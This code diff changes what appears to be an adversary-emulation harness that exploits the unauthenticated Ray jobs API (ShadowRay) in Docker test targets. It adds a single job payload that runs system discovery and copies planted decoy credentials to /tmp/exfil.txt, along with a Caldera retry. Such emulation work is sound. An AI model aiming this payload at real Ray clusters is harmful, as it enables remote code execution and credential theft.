@@ -72,7 +72,11 @@ def _shadowray_t1190(target: DockerEnvironment, attacker: AttackerEnv,
     submit_cmd = (
         'python3 -c "import requests, json, sys; '
         "payload = {\\\"entrypoint\\\": "
-        "\\\"echo SHADOWRAY_CVE_OK > /tmp/cve_marker.txt && hostname > /tmp/cve_host.txt\\\"}; "
+        "\\\"echo SHADOWRAY_CVE_OK > /tmp/cve_marker.txt && "
+        "hostname > /tmp/cve_host.txt && "
+        "uname -a > /tmp/discovery.txt && "
+        "cat /etc/os-release >> /tmp/discovery.txt && "
+        "cat /opt/sensitive/credentials.txt /opt/sensitive/manifest.txt > /tmp/exfil.txt\\\"}; "
         f"r = requests.post(\\\"http://{target_ip}:8265/api/jobs/\\\", json=payload, timeout=30); "
         "sys.stdout.write(f\\\"status={r.status_code} body={r.text[:200]}\\\\n\\\")\""
     )
@@ -80,14 +84,16 @@ def _shadowray_t1190(target: DockerEnvironment, attacker: AttackerEnv,
         submit_cmd, log_name="techniques/T1190_job_submit.log", timeout=60,
     )
 
-    # Give the surrogate / real dashboard a moment to actually execute.
-    time.sleep(3)
-
     # Step 3: verify the marker landed on the target.
     verify = target.run_shell(
+        "for i in $(seq 1 30); do "
+        "  test -s /tmp/cve_marker.txt && break; "
+        "  sleep 1; "
+        "done; "
         "cat /tmp/cve_marker.txt 2>/dev/null || echo MISSING; "
         "cat /tmp/cve_host.txt 2>/dev/null || echo MISSING",
         log_name="techniques/T1190_verify_rce.log",
+        timeout=40,
     )
     success = "SHADOWRAY_CVE_OK" in verify.stdout
 
@@ -115,18 +121,14 @@ def _shadowray_t1082(target: DockerEnvironment, attacker: AttackerEnv,
                      realization: Realization) -> TechniqueOutcome:
     """T1082 — System Information Discovery post-exploitation."""
     start = _now()
-    payload = (
-        'python3 -c "import requests; '
-        "p = {\\\"entrypoint\\\": "
-        "\\\"uname -a > /tmp/discovery.txt && cat /etc/os-release >> /tmp/discovery.txt\\\"}; "
-        f"requests.post(\\\"http://{target_ip}:8265/api/jobs/\\\", json=p, timeout=30); "
-        "print('submitted')\""
-    )
-    attacker.run_shell(payload, log_name="techniques/T1082_submit.log", timeout=60)
-    time.sleep(3)
     verify = target.run_shell(
+        "for i in $(seq 1 30); do "
+        "  test -s /tmp/discovery.txt && break; "
+        "  sleep 1; "
+        "done; "
         "cat /tmp/discovery.txt 2>/dev/null | head -10",
         log_name="techniques/T1082_discovery_output.log",
+        timeout=40,
     )
     success = "Linux" in verify.stdout or "Ubuntu" in verify.stdout
     return TechniqueOutcome(
@@ -137,9 +139,11 @@ def _shadowray_t1082(target: DockerEnvironment, attacker: AttackerEnv,
         executed_mode=ExecutionMode.real_controlled,
         realization=realization,
         status="success" if success else "failure",
-        evidence_files=["techniques/T1082_submit.log", "techniques/T1082_discovery_output.log"],
+        evidence_files=["techniques/T1190_job_submit.log",
+                        "techniques/T1082_discovery_output.log"],
         duration_sec=_now() - start,
-        notes="System info read remotely via the same Ray RCE.",
+        notes="System information verified from the same unauthenticated Ray "
+              "RCE job that established execution.",
     )
 
 
@@ -148,26 +152,21 @@ def _shadowray_t1005(target: DockerEnvironment, attacker: AttackerEnv,
                      realization: Realization) -> TechniqueOutcome:
     """T1005 — Data from Local System."""
     start = _now()
-    # Plant some data to collect (typical ShadowRay scenario: training data,
-    # model artifacts on the compute node).
+    # The SUT composition already plants these decoy ML artifacts before the
+    # exploit; this step records the source material for the technique-level
+    # audit trail without changing the environment after T1190.
     target.run_shell(
-        "mkdir -p /opt/sensitive && "
-        "echo 'API_KEY=ya29.demo-credential' > /opt/sensitive/credentials.txt && "
-        "echo 'training_dataset_v3.parquet' > /opt/sensitive/manifest.txt",
-        log_name="techniques/T1005_seed_target.log",
+        "cat /opt/sensitive/credentials.txt /opt/sensitive/manifest.txt",
+        log_name="techniques/T1005_source_data.log",
     )
-    payload = (
-        'python3 -c "import requests; '
-        "p = {\\\"entrypoint\\\": "
-        "\\\"cat /opt/sensitive/credentials.txt /opt/sensitive/manifest.txt > /tmp/exfil.txt\\\"}; "
-        f"requests.post(\\\"http://{target_ip}:8265/api/jobs/\\\", json=p, timeout=30); "
-        "print('submitted')\""
-    )
-    attacker.run_shell(payload, log_name="techniques/T1005_submit.log", timeout=60)
-    time.sleep(3)
     verify = target.run_shell(
+        "for i in $(seq 1 30); do "
+        "  test -s /tmp/exfil.txt && break; "
+        "  sleep 1; "
+        "done; "
         "cat /tmp/exfil.txt 2>/dev/null",
         log_name="techniques/T1005_exfil_evidence.log",
+        timeout=40,
     )
     success = "API_KEY" in verify.stdout
     return TechniqueOutcome(
@@ -178,12 +177,12 @@ def _shadowray_t1005(target: DockerEnvironment, attacker: AttackerEnv,
         executed_mode=ExecutionMode.real_controlled,
         realization=realization,
         status="success" if success else "failure",
-        evidence_files=["techniques/T1005_seed_target.log",
-                        "techniques/T1005_submit.log",
+        evidence_files=["techniques/T1005_source_data.log",
+                        "techniques/T1190_job_submit.log",
                         "techniques/T1005_exfil_evidence.log"],
         duration_sec=_now() - start,
-        notes="Sensitive credentials read via the same unauthenticated job "
-              "submission, then exfiltrated to attacker container.",
+        notes="Sensitive data verified from the same unauthenticated Ray RCE "
+              "job that established execution.",
     )
 
 
@@ -573,6 +572,26 @@ def _caldera_driven(target: DockerEnvironment, tid: str,
         technique_id=tid,
         run_dir=run_dir,
     )
+    attempts = [result]
+    if (not result.ok) and result.ability_id:
+        # Caldera agents poll the C2 asynchronously. A single operation can
+        # miss its pickup window on a busy local Docker host; retry once as a
+        # new operation and keep both report files in the manifest.
+        time.sleep(5)
+        retry = caldera_operation.dispatch_via_caldera(
+            container=target.container_name,
+            technique_id=tid,
+            run_dir=run_dir,
+        )
+        attempts.append(retry)
+        if retry.ok:
+            retry.evidence_files = [*result.evidence_files, *retry.evidence_files]
+            result = retry
+        else:
+            result.evidence_files = [
+                *result.evidence_files,
+                *retry.evidence_files,
+            ]
     # Distinguish "Caldera attempted but the ability failed" (caldera_driven +
     # status=failure) from "Caldera had nothing to attempt" (naive_simulated).
     no_ability = (not result.ability_id) or "no Caldera ability" in (result.error or "")
@@ -584,10 +603,14 @@ def _caldera_driven(target: DockerEnvironment, tid: str,
     if result.ok:
         notes = (f"Caldera operation {result.operation_id} link {result.link_id} "
                  f"status={result.status} exit_code={result.exit_code}")
+        if len(attempts) > 1:
+            notes += " after one retry"
     else:
         notes = (f"Caldera dispatch attempted but ability did not complete: "
                  f"{result.error or 'link status non-zero'}; "
                  f"operation={result.operation_id} ability={result.ability_id}")
+        if len(attempts) > 1:
+            notes += " after one retry"
 
     return TechniqueOutcome(
         technique_id=tid,
@@ -693,6 +716,7 @@ _ALL_CAMPAIGN_IDS = (
     "0.salesforce_data_exfiltration",
     "0.caldera_linux_demo",
     "0.fin6_emulation",
+    "0.dmz_segmentation_demo",
 )
 
 CAMPAIGN_WALKERS: dict[str, CampaignWalker] = {
